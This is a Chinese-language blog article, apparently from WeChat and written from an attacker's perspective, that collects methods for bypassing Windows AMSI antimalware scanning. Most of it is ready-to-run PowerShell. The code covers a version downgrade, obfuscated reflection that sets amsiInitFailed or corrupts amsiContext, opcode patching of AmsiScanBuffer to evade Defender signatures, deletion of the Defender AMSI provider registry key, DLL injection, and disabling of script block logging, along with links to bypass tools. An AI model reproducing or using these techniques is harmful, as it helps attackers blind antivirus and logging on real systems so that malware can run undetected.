<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/orphC8CkPr7z6HS_5KQP2g)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoJLCggZxA8KVWmHaXdhphQHViccV8VmaG1nkb4XBIicMRRuK5TGt77icEA/640?wx_fmt=png)

    AMSI 是 Windows 反恶意软件扫描的 API 接口，它允许任何应用程序与防病毒产品集成，且在 Windows 10 和 Windows Server 2016 上默认安装并启用。它的作用就是扫描、检测、阻断。对于我们攻击手来说，可以说十分恶心。

目前与 AMSI 集成的 Windows 组件如下：

*   用户账户控制或者 UAC（exe、com、msi 或 ActiveX 安装）
    
*   Powershell（脚本、交互使用和动态代码评估）
    
*   Windows 脚本宿主（wscript.exe 和 cscript.exe）
    
*   JavaScript 和 VBScript
    
*   Office VBA 宏
    

**AMSI 的工作原理：**

    当用户执行脚本或启动 PowerShell 时，AMSI.dll 被注入进程内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。

1. AmsiScanBuffer()

2. AmsiScanString()

    如果识别出已知签名，则不会启动执行，并且会出现一条消息，表明脚本已被防病毒软件阻止。下图说明了 AMSI 扫描的过程。

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoP71LQOsBbGfdRTgjIGZ15czGsmJO36qgoY0ayAyxgHINLGQ7ngYSfA/640?wx_fmt=png)

**AMSI Bypass 1.** **PowerShell 降级**

    Windows PowerShell 2.0 虽然已被 Microsoft 弃用，但是它并没有从操作系统中移除，老版本的 PowerShell 不包含 AMSI 保护等安全控制措施，所以可以借此绕过 AMSI。命令如下：

```
powershell -version 2
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoLwyHibKC2aHpkeX8o1wJU5iatxzWUAcf0dmrXozskhricfSGgTYSGHDWw/640?wx_fmt=png)

**AMSI Bypass 2.** **Base64 编码**

    在触发 AMSI 并运行解码的字符串时，使用 Base64 编码对字符串进行编码，以此逃避微软签名的检测，通过设置 amsilnitFailed 标致来阻止当前进程的 AMSI 扫描功能。

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaojxJVgeP24StkNQ8EYF9bvZLFI0UW430s8jvCdFT6YqKeVSvAILd9ibQ/640?wx_fmt=png)

**AMSI Bypass 3.** **强制错误混淆**

    强制 AMSI 初始化失败 (amsiInitFailed) 将导致不会为当前进程启动扫描。命令如下：

```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaowp0Xiagib6PMrcrjw1fW10SkxEn0FdfVyMRAMZnswg3o3Odic7Ctibop3g/640?wx_fmt=png)

**AMSI Bypass 4.** **内存修改**

    此工具是通过修改内存中的 AMSI_RESULT 函数指令，以防止将内容发送到 Windows Defender 或任何其他 AMSI 提供商。

AMSI-Bypass.ps1 工具下载地址：（Powershell 版本）

```
https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoeZkDsiasULvicaVT0UdG1moRNu8ibZlBEPwl2qvqDYlmXw8hT4M61aZVg/640?wx_fmt=png)

AMSI-Bypass.cs 工具下载地址：（C# 版本）

```
https://gist.github.com/am0nsec/854a6662f9df165789c8ed2b556e9597
```

**AMSI Bypass 5.** **修改操作码**

    其本质还是对内存指令进行修改，通过修补 AmsiScanBuffer() 函数从而达到返回 AMSI_RESULT_CLEAN 结果的目的，这结果表明未找到检测。

    原项目的 AMSI 绕过已经失效：

```
https://github.com/rasta-mouse/AmsiScanBufferBypass
```

    那么这里利用不同的机器语言指令（操作码），从而避开 AMSI 的检测。其实很好理解，就是修改了特征值，如下：

    当使用 [System.Runtime.InteropServices.Marshal]::Copy. 这是将字节复制到 AmsiScanBuffer() 的内存地址的时间。你正在复制的字节是 “操作码”，用于指定调用 AmsiScanBuffer() 时 CPU 将执行的指令。操作码字节执行以下操作：

```
b8 57 00 07 80         mov   eax, 0x80070057
c3                     ret
```

    0x80070057 是 AMSI_RESULT_CLEAN 的十六进制值，Windows Defender 会检测这特定的字节，所以将其改成功能等效的指令：

```
xor    eax,eax
add    eax,0x7f190178
add    eax,0xedfedf
ret
```

    这里解释一下为什么是 0x7f190178 和 0xedfedf ，因为这两个相加等于 0x80070057 。

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoVE0XfVPJq9v2W2lG1EOpybTKDsJx324TVasibuGvCEcEygre27Jta9A/640?wx_fmt=png)

    所以这里的值不非得是 0x7f190178 和 0xedfedf ，只要这两个值相加等于 0x80070057 的都可以。那如何将上面的汇编指令转换成字节码呢，我是这么做的。

利用在线 x86/x64 汇编器和反汇编器网站：

```
https://defuse.ca/online-x86-assembler.htm
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoa1JFhtzdQyxoZKElKDb2tGbRBemsbnc6nrf9FYebEIygPqn7zzjfRw/640?wx_fmt=png)

    就可以得到字节码了。

（PS：我也就只摸清楚了这款工具的实现原理...![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaowpDvqoptQslNJOab2lEUt7C6RicOPicjf1v4CD4uISBKAEa3fr6ZibbkA/640?wx_fmt=png)）

my-am-bypass.ps1 工具下载地址：

```
https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoyicar6ghbl1uSxm7LQa38CJ7kJ6rkGq8laaibhfzs3esKoraoG1icvTpg/640?wx_fmt=png)

****AMSI Bypass 6.**** **修改注册表**

    这方法不太推荐，因为需要提升权限，而且这方法并不隐秘。对于修改注册表的行为，安全设备必定会阻止的。当然，单从绕过 AMSI 的思路角度出发，这也是其中一种绕过思路。

    执行以下命令：

```
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

    这样就相当于禁用了 Windows Defender 执行 AMSI 检查和逃避控制的能力。删除 AMSI 提供程序的注册表项，Windows Defender 的 GUID 注册表路径为

```
HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoSx6JjCdKFUjOJXunJ7eRnZDpwJgze3d5ge2uozY0wjXPumzmWic8Eqw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoWRMP2p6ZmEoud65tz76WnmbiaV7WZhyvHK87V5l2MRWM3Y3os4gnmkw/640?wx_fmt=png)

下面列出的是自己在测试过程中发现已经失效的老方法，也记录一下。  

**Bypass 老方法失效（一）：禁用 AM****S****I**

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiao4DsOTt8pHiaSZ9w5jA8z9OWaz9TYr7lPGbsyNxAZgibd4FibDpS5kDrAg/640?wx_fmt=png)

**Bypass 老方法失效（二）：****AmsiTrigger** **扫描缓冲区绕过**

```
.\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaogauyzBWse8RhBVb5ibKOlEj8khvElN3OORUVLTIh3ibOKbbPcMfoOyJg/640?wx_fmt=png)

AmsiTrigger 工具地址：

```
https://github.com/RythmStick/AMSITrigger
```

ASBBypass.ps1 下载地址：

```
https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1
```

**Bypass 老方法失效（三）：强制错误**

```
$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiao4hHxNIvJrFZ09icricP4iaiaNjFM2QVs6ljYJfwHLz33iawJwO4CDP1Xchg/640?wx_fmt=png)

还有一种强制报错的命令如下：

```
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoEh7yK7bSbu2PAtHVpcHSykr4snouRHeWbc9JDoIa7pgFqwsJpuywpQ/640?wx_fmt=png)

**Bypass 老方法失效（四）：Hook Powershell**

通过将 AmsiHook.dll 文件注入到 PowerShell 进程中，从而绕过 AMSI 检测。

AmsiHook 项目地址：

```
https://github.com/tomcarver16/AmsiHook
```

SimpleInjector 注射器项目地址：

```
https://github.com/tomcarver16/SimpleInjector
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoRTjkygRkQqEH66mtlBk3wicodQOMaAw7xHq6tljebE9emKlP7G8oCrw/640?wx_fmt=png)

这里我已经编译好了，执行以下命令：

```
.\SimpleInjector.exe powershell.exe .\AmsiHook.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiaoPvsW6G2ysLh0vUPAsB9KKebqriccwJAjmAjRVO4IeOicbVmRAYUaXeVA/640?wx_fmt=png)

**Bypass 老方法失效（五）：禁用脚本日志记录**

```
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);

$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}

$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wEk5wxtLfTjahQUOHldAiao2X3NW9a6COy2bQH3iaIlvaSKkiczs54fVmYocVX6xAVDQX2UZ64lM6ZQ/640?wx_fmt=png)

```
## 官方AMSI解释：
https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal

## 参考资料：
https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
https://rastamouse.me/memory-patching-amsi-bypass/
```